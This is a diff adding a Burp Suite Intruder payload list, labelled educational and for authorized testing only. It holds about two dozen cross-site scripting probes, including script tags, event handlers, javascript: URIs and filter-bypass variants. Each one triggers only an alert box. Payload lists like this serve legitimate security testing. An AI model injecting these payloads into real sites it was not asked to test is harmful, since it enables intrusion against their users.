@@ -1,0 +1,27 @@
+# Payload Lab - Burp Suite Intruder Payload List
+# EDUCATIONAL USE ONLY - AUTHORIZED TESTING ENVIRONMENTS ONLY
+# Generated: 2026-02-14 23:20:12
+
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe src=javascript:alert('XSS')>
+" onmouseover="alert('XSS')"
+' onclick='alert("XSS") '
+javascript:alert('XSS')
+data:text/html,<script>alert('XSS')</script>
+'; alert('XSS'); //
+"; alert('XSS'); //
+</script><script>alert('XSS')</script>
+#<img src=x onerror=alert('XSS')>
+javascript:alert('XSS')
+<img src=1 onerror=alert(document.domain)>
+<script>alert('Stored XSS')</script>
+<img src=x onerror=alert('Persistent')>
+<svg/onload=alert('XSS')>
+<ScRiPt>alert('XSS')</ScRiPt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x oneonerrorrror=alert('XSS')>
+<svg><script>alert('XSS')</script></svg>
+&#60;script&#62;alert('XSS')&#60;/script&#62;
